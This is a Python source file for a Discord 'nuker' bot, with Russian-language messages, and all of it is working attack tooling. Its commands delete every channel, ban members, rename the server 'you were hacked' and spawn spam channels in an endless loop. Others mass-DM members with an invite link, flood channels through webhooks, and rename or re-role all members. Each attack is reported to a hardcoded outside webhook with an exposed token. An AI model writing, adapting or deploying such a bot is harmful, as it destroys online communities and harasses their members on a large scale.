import discord
from discord.ext import commands
import asyncio
import aiohttp
import requests
import time
from threading import Thread
from flask import Flask

WEBHOOK_URL = "https://discord.com/api/webhooks/1521026853316329525/KWUrGnS6x6yAknThbeJQXYFi0wCjHd8cvf1HzVorCS2DzoR-7Y8wHUD8QwzpEE4YOkWV"

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def ping_self():
    def pinger():
        while True:
            try:
                requests.get("http://127.0.0.1:8080")
            except:
                pass
            time.sleep(300)
    t = Thread(target=pinger, daemon=True)
    t.start()

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

PROTECTED_GUILD_ID = 1520817743127904477

@bot.before_invoke
async def protect_server(ctx):
    if ctx.guild and ctx.guild.id == PROTECTED_GUILD_ID:
        await ctx.send("нафиг")
        raise commands.CommandError("Protected server")

@bot.event
async def on_ready():
    print(f"Бот {bot.user} готов к уничтожению")

@bot.event
async def on_member_join(member):
    if member.guild.id == 1520817743127904477:
        role = member.guild.get_role(1520843245234553085)
        if role:
            await member.add_roles(role)

@bot.command()
async def ping(ctx):
    await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")

async def send_crash_log(guild_name, author, member_count):
    async with aiohttp.ClientSession() as session:
        embed = {
            "title": "Сервер крашнут!",
            "color": 0xff0000,
            "fields": [
                {"name": "Сервер", "value": guild_name, "inline": False},
                {"name": "Крашнул", "value": author, "inline": False},
                {"name": "Участников", "value": str(member_count), "inline": False}
            ]
        }
        await session.post(WEBHOOK_URL, json={"content": "@everyone", "embeds": [embed]})

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    await send_crash_log(guild.name, ctx.author.mention, guild.member_count)
    
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    ban_tasks = [member.ban(reason="NUKE") for member in guild.members if member != guild.owner and not member.bot]
    await asyncio.gather(*ban_tasks, return_exceptions=True)
    
    await guild.edit(name="ВЫ БЫЛИ ВЗЛОМАНЫ")
    
    i = 0
    while True:
        tasks = []
        for _ in range(10):
            async def create_ch(idx):
                ch = await guild.create_text_channel(f"crash-{idx}")
                await ch.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
            tasks.append(create_ch(i))
            i += 1
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dmall(ctx, *, message):
    guild = ctx.guild
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(f"{message}\n\nhttps://discord.gg/W9fRBPUGbV")
            except:
                pass
    await ctx.send("Рассылка завершена", delete_after=1)

@bot.command()
async def webhook(ctx, *, message):
    guild = ctx.guild
    for channel in guild.text_channels:
        try:
            wh = await channel.create_webhook(name="CRASH")
            asyncio.create_task(spam_webhook(wh, message))
        except:
            pass
    await ctx.send("Вебхуки созданы", delete_after=1)

async def spam_webhook(wh, message):
    while True:
        try:
            await wh.send(f"@everyone {message}\n\nhttps://discord.gg/W9fRBPUGbV",
                          username="CRASHED", avatar_url=None)
        except:
            break
        await asyncio.sleep(0.5)

@bot.command()
async def rename(ctx, *, nickname):
    guild = ctx.guild
    for member in guild.members:
        if not member.bot:
            try:
                await member.edit(nick=nickname)
            except:
                pass
    await ctx.send("Ники изменены", delete_after=1)

@bot.command()
async def photo(ctx):
    if not ctx.message.attachments:
        await ctx.send("Прикрепи фото")
        return
    await ctx.send(f"@everyone **{ctx.author.name}** кинул фото", file=await ctx.message.attachments[0].to_file())

@bot.command()
async def role(ctx, *, role_name):
    guild = ctx.guild
    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        role = await guild.create_role(name=role_name)
    for member in guild.members:
        if not member.bot:
            try:
                await member.add_roles(role)
            except:
                pass
    await ctx.send(f"Роль {role_name} выдана всем", delete_after=1)

import os

keep_alive()
ping_self()
bot.run(os.getenv("TOKEN"))
